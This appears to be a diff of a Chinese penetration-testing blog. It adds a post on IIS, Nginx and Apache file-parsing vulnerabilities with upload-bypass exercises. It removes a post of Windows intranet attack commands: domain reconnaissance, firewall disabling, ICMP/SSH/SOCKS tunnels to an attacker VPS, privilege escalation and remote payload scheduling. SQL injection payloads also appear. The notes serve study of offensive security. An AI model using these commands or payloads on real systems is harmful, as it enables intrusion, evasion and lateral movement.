@@ -132,7 +132,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -176,6 +176,100 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/21/%E8%A7%A3%E6%9E%90/%E4%B8%80%E4%BA%9B%E8%80%81%E6%8E%89%E7%89%99%E4%BD%86%E6%98%AF%E5%A5%BD%E7%90%86%E8%A7%A3%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/03/21/%E8%A7%A3%E6%9E%90/%E4%B8%80%E4%BA%9B%E8%80%81%E6%8E%89%E7%89%99%E4%BD%86%E6%98%AF%E5%A5%BD%E7%90%86%E8%A7%A3%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">一些老掉牙但是好理解的解析漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-03-21 20:57:52 / 修改时间：21:24:48" itemprop="dateCreated datePublished" datetime="2022-03-21T20:57:52+08:00">2022-03-21</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>解析漏洞是指服务器应用程序在解析某些静态文件或者动态文件时，会将其解析成网页脚本，从而导致网站的沦陷</p>
+<h2 id="IIS-Nginx-php-fastcgi取值错误解析漏洞-配置漏洞"><a href="#IIS-Nginx-php-fastcgi取值错误解析漏洞-配置漏洞" class="headerlink" title="IIS/Nginx+php fastcgi取值错误解析漏洞(配置漏洞)"></a>IIS/Nginx+php fastcgi取值错误解析漏洞(配置漏洞)</h2><p>开启了cgi.fix_pathinfo如果开启以后，所执行文件不存在，会继续查找上一级文件是否存在。index.php/id/2</p>
+<p>并且未设置security.limit_extensions该选项限制可以执行的文件类型</p>
+<p>示例:abcde.jpg/.php</p>
+<h3 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h3><p>选择一个phpinfo.jpg进行上传，内容为phpinfo();，但被拦截应该是不仅对扩展名验证还对文件内容进行了验证，所以采取copy命令将一张gif和phpinfo进行构造过文件类型检测，上传成功并能成功访问图片，随后访问url/xx.gif/1.php，便能够访问到phpinfo页面</p>
+<h2 id="Nginx文件名逻辑漏洞-CVE-2013-4547"><a href="#Nginx文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="Nginx文件名逻辑漏洞(CVE-2013-4547)"></a>Nginx文件名逻辑漏洞(CVE-2013-4547)</h2><p>影响版本：Nginx0.8.41 <del>1.4.3/1.5.0</del>1.5.7</p>
+<p>上传一个以空格(%20)为结尾的文件，例如abcde.jpg “</p>
+<p>当访问abcde.jpg%20%00.php时，会将刚刚上传的“abcde.jpg “文件当做php进行执行</p>
+<p>abcde.jpg%20%00.php</p>
+<p>一般的php匹配正则: .php$</p>
+<p>存在漏洞时，Nginx将abcde.jpg%20认当做了脚本文件名</p>
+<h3 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h3><p>首先上传一个phpinfo.php无法上传，上传一个phpinfo.gif可以上传，进行修改提交并截包，在文件名后面加一个空格成功上传，然后抓包修改在url后面添加%20%00.php并进行url解码访问文件，返回phpinfo页面</p>
+<h2 id="Apache解析漏洞（配置错误）"><a href="#Apache解析漏洞（配置错误）" class="headerlink" title="Apache解析漏洞（配置错误）"></a>Apache解析漏洞（配置错误）</h2><p>如果在Apach的conf文件中有如下配置</p>
+<p>AddHandler application/x-httpd-php .php</p>
+<p>则abcde.php.jpg也会被当做php去执行</p>
+<p>如果在.htaccess中有如下配置，可以将扩展名.xxx当做php执行</p>
+<p>AddType application/x-httpd-php xxx</p>
+<h3 id="练习：-2"><a href="#练习：-2" class="headerlink" title="练习："></a>练习：</h3><p>在phpinfo.gif中间加一个.php，点击上传并访问，回显phpinfo.php的页面，但如果只是单纯的上传一个图片gif文件，只会是图片回显</p>
+<h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><ol>
+<li><p>上传文件名：abcde.asp;.jpg<br>服务器默认不解析；号后面的内容，因此abcde.asp;.jpg被当做了asp文件解析</p>
+</li>
+<li><p>向xxx.asp目录下面上传abcde.jpg</p>
+</li>
+</ol>
+<p>服务器会将xxx.asp目录下的文件都当做asp文件解析</p>
+<p>（环境是在FckEditor下）</p>
+<h3 id><a href="#" class="headerlink" title></a></h3><h3 id="练习：-3"><a href="#练习：-3" class="headerlink" title="练习："></a>练习：</h3><p>上传一个内容为打印helloworld的hello.asp但并不能上传，抓包修改在文件的后面添加;.jpg发包，成功上传并访问该文件，页面成功打印出Helloworld</p>
+<p>创建一个文件夹1.asp但里面没有任何内容，把hello.asp改为hello.jpg上传到该文件夹，访问Url/1.asp/hello.jpg,成功打印helloworld</p>
+<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="查看服务器类型"><a href="#查看服务器类型" class="headerlink" title="查看服务器类型"></a>查看服务器类型</h2><p>1.F12查看响应头中的server，里面含有服务器类型的名字或者版本号（注意！可修改）</p>
+<p>2.访问一个不存在的文件，比如IIS会进行报错有服务器信息</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1497,318 +1591,6 @@ mysqli_close($conn);
 <h2 id="样例分析："><a href="#样例分析：" class="headerlink" title="样例分析："></a>样例分析：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3--</span><br><span class="line"></span><br><span class="line">select user() regexp &#x27;^ro&#x27;</span><br><span class="line"></span><br><span class="line">ascii(substr(select user()),1,1))=114</span><br><span class="line"></span><br><span class="line">if(ascii(substr((select user()),1,1))=114,0,sleep(5))</span><br><span class="line"></span><br><span class="line">(ascii(substr((select table_name from information_schema.t</span><br><span class="line">ables where table_schema=database() limit 0,1),1,1)=9)</span><br><span class="line"></span><br><span class="line">updataxml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
 
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/15/trick/%E5%86%85%E7%BD%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/pic.jpg">
-      <meta itemprop="name" content="D0gekong">
-      <meta itemprop="description" content="散人的漫漫学习路">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hack the world">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/15/trick/%E5%86%85%E7%BD%91/" class="post-title-link" itemprop="url">内网信息搜集</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-03-15 13:12:35" itemprop="dateCreated datePublished" datetime="2022-03-15T13:12:35+08:00">2022-03-15</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-07-08 22:01:02" itemprop="dateModified" datetime="2022-07-08T22:01:02+08:00">2022-07-08</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>手动信息搜集:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all  查询网络配置信息</span><br><span class="line">systeminfo 查询系统信息/可以看当前域</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%  查看系统体系结构</span><br><span class="line">wmic product get name,version 查看安装的软件以及版本，路径等</span><br><span class="line">wmic service list brief 查询本机服务信息</span><br><span class="line">tasklist 查询进程列表</span><br><span class="line">schtasks /query /fo LIST /v 查看计划任务</span><br><span class="line">net statistics workstation 查看主机开机时间</span><br><span class="line">net user 查询用户列表</span><br><span class="line">net localgroup administrator 获取本地管理员信息</span><br><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net session 列出或断开本地计算机与所连接的客户端之间的会话</span><br><span class="line">netstat -ano 查询端口列表</span><br><span class="line">net share 查询本机共享列表</span><br><span class="line">关闭防火墙:</span><br><span class="line">	2003之前:netsh firewall set opmode disable</span><br><span class="line">	2003之后:netsh advfirewall set allprofiles state off</span><br><span class="line">netsh firewall show config 查看防火墙配置</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action =allow 允许3389端口放行</span><br><span class="line">开启3389:</span><br><span class="line">	2003中:wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line">	2008和2012中:reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br><span class="line">whoami /all 获取域SID</span><br><span class="line">net user xxx /domain 查看指定用户的详细信息</span><br><span class="line">net config workstation 查看当前登录域以及登录用户信息</span><br><span class="line">net time /domain 三种情况</span><br><span class="line">	存在域，但是当前用户不是域用户，会出现拒绝访问</span><br><span class="line">	存在域，当前用户是域用户，会出现时间</span><br><span class="line">	不存在域，出现找不到域WORKGROUP的域控制器</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr &quot;TTL=&quot;</span><br><span class="line">net view /domain 查询域</span><br><span class="line">net view /domain:HACKE 查询域内所有计算机</span><br><span class="line">net group /domain 查询域内所有用户组列表</span><br><span class="line">net group &quot;domain computers&quot; /domain 查询所有域成员计算机列表</span><br><span class="line">net accounts /domain 获取域密码信息</span><br><span class="line">nltest /domain_trusts 获取域信任信息</span><br><span class="line">nltest /DCLIST:hacke 查看域控的机器名</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查看域控制器组</span><br><span class="line">netdom query pdc 查看域控制器组</span><br><span class="line">wmic useraccount get /all 获取域内用户的详细信息</span><br><span class="line">dsquery user 查看存在的用户</span><br><span class="line">net localgroup administrators 查询本地管理员组用户</span><br><span class="line">net group &quot;domain admins&quot; /domain 查询域管理员用户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 获取域管理员列表</span><br><span class="line">tasklist /v 列出本机的所有进程及进程用户</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 收集域管理员列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a>隐藏通信隧道</h1><ul>
-<li>网络层:IPv6隧道,ICMP隧道,GRE隧道</li>
-<li>传输层:TCP隧道,UDP隧道,常规的端口转发</li>
-<li>应用层:SSH隧道,HTTP隧道,HTTPS隧道,DNS隧道</li>
-</ul>
-<h2 id="ICMP隧道—网络层"><a href="#ICMP隧道—网络层" class="headerlink" title="ICMP隧道—网络层"></a>ICMP隧道—网络层</h2><p>使用PingTunner工具，在web服务器执行如下代码<code>ptunnel -x shuteer</code>，在VPS服务器中执行如下命令 <code>ptunnel -p web服务器ip -lp 1080 -da 服务器内网其他服务器IP -dp 服务器内网其他服务器端口 -x ch1e</code></p>
-<ul>
-<li>-x  指定隧道连接的验证密码</li>
-<li>-lp 指定要监听的本地TCP端口</li>
-<li>-da 指定要转发的模板机器的ip地址</li>
-<li>-dp 指定要转发的目标机器的tcp端口</li>
-<li>-p 指定icmp隧道另一端的机器的ip地址</li>
-</ul>
-<p>下面举个例子，比如 <code>ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389</code>  ,上面这条命令就是在访问攻击者VPS的ip也就是192.168.1.5的1080端口，他会把数据库服务器1.1.1.10的3389端口的数据封装在ICMP隧道里，只需要访问192.168.1.5的1080端口即可连接1.1.1.10 的远程桌面</p>
-<p>特征:会产生大量的ICMP数据包，会在所有ICMP payload前面加上TUNL标记</p>
-<h2 id="端口转发—传输层"><a href="#端口转发—传输层" class="headerlink" title="端口转发—传输层"></a>端口转发—传输层</h2><h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在公网vps上执行，把本地监听的4444端口转发到5555端口</p>
-<p><code>lcx.exe -listen 4444 5555</code></p>
-<p>目标机器执行，把目标机器3389端口的数据转发到公网4444端口上</p>
-<p><code>lcx.exe -slave 公网主机ip地址 4444 127.0.0.1 3389</code></p>
-<p>使用远程桌面登录 公网主机ip地址:5555即可访问目标服务器的3389端口</p>
-<h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器有防火墙限制，3389等端口数据无法通过，可以吧数据传到防火墙允许的其他端口，比如53</p>
-<p><code>lcx.exe -tran 53 目标主机ip地址 3389</code></p>
-<h2 id="SSH隧道—应用层"><a href="#SSH隧道—应用层" class="headerlink" title="SSH隧道—应用层"></a>SSH隧道—应用层</h2><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>一般SSH协议是被运行通过防火墙和边界设备的，所以可以使用ssh协议开启隧道，主要参数如下</p>
-<ul>
-<li>-C:压缩传输，提高速度</li>
-<li>-f:把ssh传输转入后台执行，不占用当前的shell</li>
-<li>-N:建立静默链接，只是看不到会话</li>
-<li>-g:允许远程主机连接本地用于转发的端口</li>
-<li>-L:本地端口转发</li>
-<li>-R:远程端口转发</li>
-<li>-D:动态转发</li>
-<li>-P:指定SSH端口</li>
-</ul>
-<p>Example:<code>ssh -CfNg -L VPS端口:目标主机:目标端口 root@跳板机ip(一般是web服务器ip)</code></p>
-<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>以web服务器为跳板，把VPS的3307端口的流量转发到1.1.1.10的3389端口，然后访问VPS的3307端口 ，就可以访问到1.1.1.10的3389端口了</p>
-<p><code>ssh -CfNg -R 3307:1.1.1.10:3389 root@192.168.1.4</code></p>
-<p>防御思路：在ACL中限制只有特定的IP地址才能连接ssh</p>
-<h2 id="HTTP-HTTPS隧道—应用层"><a href="#HTTP-HTTPS隧道—应用层" class="headerlink" title="HTTP/HTTPS隧道—应用层"></a>HTTP/HTTPS隧道—应用层</h2><p>常见的代理工具有reGeorg,meterpreter，tunna等</p>
-<p>reGeorg支持ASPX PHP JSP等Web脚本，首先得把脚本文件上传到目标服务器上，然后运行以下命令</p>
-<p><code>python reGeorgSocksProxy.py -u http://192.168.184.149:8080/tunnel.jsp -p 9999</code></p>
-<p>然后可以使用类似ProxyChains之类的工具</p>
-<h2 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h2><p>EarthWorm：ew</p>
-<h3 id="普通网络环境"><a href="#普通网络环境" class="headerlink" title="普通网络环境"></a>普通网络环境</h3><p>正向socks5服务器：</p>
-<p><code>ew -s ssocksd -l 888</code> 执行上述命令，即可架设一个端口为888的socks代理</p>
-<p>反向socks5服务器:</p>
-<p>在个人公网vps上输入如下命令: </p>
-<p><code>ew -s rcsocks -l 1080 -e 888</code>  在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 888 端口的主机</p>
-<p>在Web服务器上使用如下命令:</p>
-<p><code>ew -s rssocks -d 1.1.1.1 -e 888</code> 1.1.1.1是个人的公网vps的IP，将目标网络的可控边界主机反向连接公网主机1.1.1.1</p>
-<p>所以我们可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</p>
-<h3 id="二重网络环境"><a href="#二重网络环境" class="headerlink" title="二重网络环境"></a>二重网络环境</h3><p>对于二重网络环境：<br>    1.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
-<pre><code>        A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源
-        B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网
-        A 主机可直连 B 主机
-        
-                                可控边界主机A             可访问指定资源的主机B
-          +---------+     +-----------------------+      +-----------------+
-          |HackTools| -&gt;&gt; | 1080 --&gt;  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 2.2.2.3 |
-          +---------+     +-----------------------+      +-----------------+
-
-        a)  ./ew -s ssocksd -l 9999
-                // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
-        b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 
-                // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。
-        c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。
-        
-2.  获得目标网络内两台主机 A、B 的权限，情况描述如下：
-
-        A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
-        B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。
-
-        A 主机可直连 B 主机
-                              一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B
-          +---------+     +--------------------------+    |    +-----------------+      +-----------------+
-          |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt; | 9999 -&gt; 2.2.2.3 |
-          +---------+     +--------------------------+    |    +-----------------+      +-----------------+
-
-        a)  ./ew -s lcx_listen -l 1080 -e 8888
-                    // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求
-                    // 转交给反连 8888 端口的主机
-        b)  ./ew -s ssocksd -l 9999
-                    // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
-        c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
-                    // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道
-        d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理
-</code></pre>
-<h2 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h2><ul>
-<li>ICMP:ping baidu.com</li>
-<li>TCP:nc -zv xxx.xxx.xxx.xxx</li>
-<li>HTTP:curl <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></li>
-<li>DNS:nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> vps-ip</li>
-</ul>
-<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h2><p>User:普通用户权限，系统中最安全的权限</p>
-<p>Administrator:管理员权限，可以提升为System权限，方便操作SAM文件</p>
-<p>System:系统权限</p>
-<p>TrustedInstaller:Windows中的最高权限，只有这个权限才能修改系统文件</p>
-<h2 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h2><ul>
-<li>系统内核溢出漏洞提权</li>
-<li>数据库提权</li>
-<li>错误的系统配置提权</li>
-<li>组策略首选项提权</li>
-<li>Web中间件漏洞提权</li>
-<li>DLL劫持提权</li>
-<li>滥用高权限令牌提权</li>
-<li>第三方服务/软件提权</li>
-</ul>
-<h3 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h3><p>如果没有及时打补丁，我们就可以找到对应的exp进行提权</p>
-<p>首先可以输入命令<code>systeminfo</code>，然后放到Windows提权辅助工具里寻找可用的exp即可</p>
-<p>防御方法:打好补丁</p>
-<h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件，如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以把该文件替换成任意可执行文件，并随着系统服务器的启动获得可执行权限。</p>
-<p>存在下面两种可能:</p>
-<ul>
-<li>服务未运行，攻击者使用任意服务替换原来的服务，然后重启服务</li>
-<li>服务正在运行并且无法终止，攻击者通常会利用DLL劫持尝试重启服务来提权</li>
-</ul>
-<p>我们可以使用Metasploit，对应的利用模块是service_permissions 选择AGGRESSIVE选项，可以利用目标机器上每一个有缺陷的服务。</p>
-<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated是有个策略设置项，Windows允许低权限用户以System权限允许安装文件，如果启动此选项，任何权限的用户都能以NT/AUTHORITY安装msi文件。</p>
-<p>漏洞产生原因:开启了Windows Instaler特权安装功能</p>
-<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>可信任服务路径(包含空格且没有引号的路径)利用了Windows文件路径解析的特性，并涉及服务路径/文件夹权限。如果一个服务调用的可执行文件没有正确的处理所引用的完整路径名，这个漏洞就可以被攻击者用来上传任意可执行文件。</p>
-<p>这里主要介绍MSF下的实战利用</p>
-<p><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code> </p>
-<p>然后检测是否有对目标文件夹的写入权限，使用Windows内置的icacls根据，依次检查上一步输出的路径，会发现有些目录后有Everyone:(OI)(CI)(F)字样</p>
-<ul>
-<li>Everyone:用户对这个文件夹有完全控制权限，所有用户都具有修改这个文件夹的权限</li>
-<li>(M)：修改</li>
-<li>(F)：完全控制</li>
-<li>(CI)：从属容器将继承访问控制项</li>
-</ul>
-<p>Everyone:(OI)(CI)(F)的意思就是用户对这个文件夹有读，写，删除其下文件，删除子目录的权限</p>
-<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并且放置在存在此漏洞且科协的目录下，执行以下命令，尝试重启服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
-
-<p>也可以使用Metasploit中的Windows Service Trusted Path Privilege Escalation模块</p>
-<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在多台机器配置同一个环境时，通常不会逐台配置，会使用批量部署的方法，在这过程中会安装配置文件，包含所有安装配置信息。</p>
-<ul>
-<li>C:\sysprep.ini</li>
-<li>C:\sysprep\sysoreo.xml</li>
-<li>C:\Windows\system32\sysprep.inf</li>
-<li>C:\Windows\system32\sysprep\sysprep.xml</li>
-<li>C:\unattend.xml</li>
-<li>C:\Windows\Panther\Unattend.xml</li>
-<li>C:\Windows\Panther\Unattended.xml</li>
-<li>C:\Windows\Panther\Unattend\Unattended.xml</li>
-<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
-<li>C:\Windows\System32\Sysprep\unattend.xml</li>
-<li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li>
-</ul>
-<p>也可以执行如下命令进行搜索</p>
-<p><code>dir /b /s c:\Unattend.xml</code></p>
-<p>Metasploit中集成了该漏洞的利用模块post/windows/gather/enum_unattend</p>
-<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>可以用如下命令查看计算机的计划任务</p>
-<p><code>schtasks /query /fo LIST /v</code></p>
-<p>我们可以查询当前权限对高权限运行的任务所在的目录是否有可写权限，如果有就可以使用恶意程序来覆盖原来的程序，这样在计划任务下次执行时，就会以高权限来运行恶意程序</p>
-<p>可以使用AccessChk是微软官方提供的一个工具，不会引起杀软的报警</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列出某个驱动器下所有权限配置有缺陷的文件夹</span><br><span class="line">	accesschk.exe -uwdqsUsersc:\</span><br><span class="line">	accesschk.exe -uwdqs&quot;AuthenticatedUsers&quot;c:\*.*</span><br><span class="line">列出某个驱动器下所有权限配置有缺陷的文件</span><br><span class="line">	accesschk.exe -uwqsUsersc:\*.*</span><br><span class="line">	accesschk.exe -uwqs“AuthenticatedUsers”c:\*.*</span><br></pre></td></tr></table></figure>
-
-<h4 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h4><p>Windows Server 2008之前版本使用，使用at创建计划任务流程如下</p>
-<ul>
-<li>使用<code>net time</code>确定远程机器当前的系统时间</li>
-<li>使用copy命令把Payload文件复制到远程目标机器中</li>
-<li>使用at命令定时启动Payload文件</li>
-<li>删除使用at命令创建计划任务的记录</li>
-</ul>
-<p>具体命令执行流程如下:</p>
-<ul>
-<li>net time \\192.168.100.1</li>
-<li>copy calc.bat\ \192.168.100.1\C$</li>
-<li>at \\192.168.100.1 4:44PM C:\calc.bat Added a new job with job ID=7</li>
-<li>at \\192.168.100.1 7 /delete</li>
-</ul>
-<h4 id="schtasks命令"><a href="#schtasks命令" class="headerlink" title="schtasks命令"></a>schtasks命令</h4><p>Windows Server2008后不使用at命令，使用schtasks命令代替at命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在远程主机上创建一个名称为test的计划任务，在开机时启动，启动权限是system</span><br><span class="line">	schtasks /create /s 192.168.100.1 /tn test /sc onstart /tr c:\calc.bat /ry system /f</span><br><span class="line">执行计划任务</span><br><span class="line">	schtasks /run /s 192.168.100.1 /i /tn &quot;test&quot;</span><br><span class="line">删除计划任务</span><br><span class="line">	schtasks /delete /s 192.168..100.1 /tn &quot;test&quot; /f</span><br><span class="line">删除ipc$</span><br><span class="line">	net use 名称 /del /y</span><br></pre></td></tr></table></figure>
-
-<h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><p>一般的域环境所有机器都是脚本化自动部署，为了方便对所有的机子进行操作，会使用组策略进行统一的管理和配置，管理员可以通过组策略统一修改密码，但是如果这样，那所有的机子的管理员密码都是相同的，我们只要获取一台的本地管理员密码，那么就相当于获得了域中所有机器的本地管理员密码</p>
-<p>常见的组策略首选项</p>
-<ul>
-<li>映射驱动器</li>
-<li>创建本地用户</li>
-<li>数据源</li>
-<li>打印机配置</li>
-<li>创建/更新服务</li>
-<li>计划任务</li>
